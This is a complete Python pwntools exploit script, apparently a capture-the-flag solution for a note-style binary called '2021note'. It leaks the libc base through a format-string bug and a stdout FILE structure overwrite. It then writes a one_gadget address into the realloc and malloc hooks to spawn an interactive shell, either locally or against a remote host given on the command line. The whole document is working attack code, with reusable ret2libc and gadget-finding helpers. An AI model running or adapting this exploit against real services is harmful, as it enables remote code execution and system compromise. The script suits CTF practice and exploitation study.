#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# -----------------------------------
# @File    :  exp.py
# @Author  :  woodwhale
# @Time    :  2021/10/04 18:12:03
# -----------------------------------

from pwn import *
from LibcSearcher import *
import sys, subprocess

arglen = len(sys.argv)
def ret2libc(leak,func,binary=null):
    libc = LibcSearcher(func,leak) if binary == null else binary
    base = leak - libc.dump(func) if binary == null else leak - libc.sym[func]
    system = base + libc.dump('system') if binary == null else base + libc.sym['system']
    binsh = base + libc.dump('str_bin_sh') if binary == null else next(libc.search(b'/bin/sh'))
    return (system,binsh)

s = lambda data : io.send(data)
sa = lambda rv,data : io.sendafter(rv,data)
sl = lambda data : io.sendline(data)
sla = lambda rv,data : io.sendlineafter(rv,data)
r = lambda num : io.recv(num)
rl = lambda keepends=True : io.recvline(keepends)
ru = lambda data,drop=True : io.recvuntil(data,drop)
ia = lambda : io.interactive()
uu32 = lambda data : u32(data.ljust(4,b'\x00'))
uu64 = lambda data : u64(data.ljust(8,b'\x00'))
i16 = lambda data : int(data,16)
leak = lambda name,addr : log.success('\033[33m{}\033[0m = \033[31m{:#x}\033[0m'.format(name, addr))
dbg = lambda point=null: (gdb.attach(io) if point == null else gdb.attach(io,f'b {point}')) if DEBUG else null
og = lambda binary : list(map(int,subprocess.check_output(['one_gadget','--raw','-f',binary]).decode().strip('\n').split(' ')))
rg = lambda binary,only,grep : i16(subprocess.check_output([f"ROPgadget --binary {binary} --only '{only}' | grep {grep}"],shell=True).decode().split(' ')[0])
setlibc = lambda leak,func : leak - libc.sym[func]
libcpath = lambda binary : subprocess.check_output(['ldd',binary]).decode().replace('\t', '').split('\n')[1].split(' ')[2] if GLIBC else subprocess.check_output(['ls | grep *.so'],shell=True).decode().replace('\n', '')
proc = lambda binary,libc=null : process(binary) if GLIBC else process(binary,env={'LD_PRELOAD':'./'+libc})

# context.log_level='debug'
# context.arch='amd64'
context.terminal = ['gnome-terminal','-x', 'bash','-c']
# 0直接略过所有dbg
DEBUG = 1
# 0表示使用当前目录下的libc，1表示使用patcher之后的glibc
GLIBC = 1
binary = './2021note'
elf = ELF(binary)
libc = ELF(libcpath(binary))
libc.path = libcpath(binary)
io = proc(binary,libc.path) if arglen == 1 else (remote(sys.argv[1].split(':')[0],sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1],sys.argv[2]))

def cmd(idx):
    sla(":",str(idx))

def add(size,content="a"):
    cmd(1)
    sla(":",str(size))
    sla(":",content)
    ru("0x")
    return(i16(r(12)))

def say(buf,content):
    cmd(2)
    sa("?",buf)
    sla("?",content)


say(b"%7$s",p64(0xfbad1800) + p64(0)*3)
libc.address = uu64(ru(b"\x7f",False)[-6:])-(0x7f2ee70626e0-0x7f2ee6c9f000)
leak("libc_base",libc.address)

malloc_hook = libc.sym["__malloc_hook"]
realloc_hook = malloc_hook-0x8
realloc = libc.sym['realloc']
ogs = og(libc.path)[1] + libc.address
leak("malloc_hook",malloc_hook)

say(b"%7$saaaa"+p64(realloc_hook),p64(ogs)+p64(realloc+0x8))
# dbg()
cmd(1)
sla(":","10")

ia()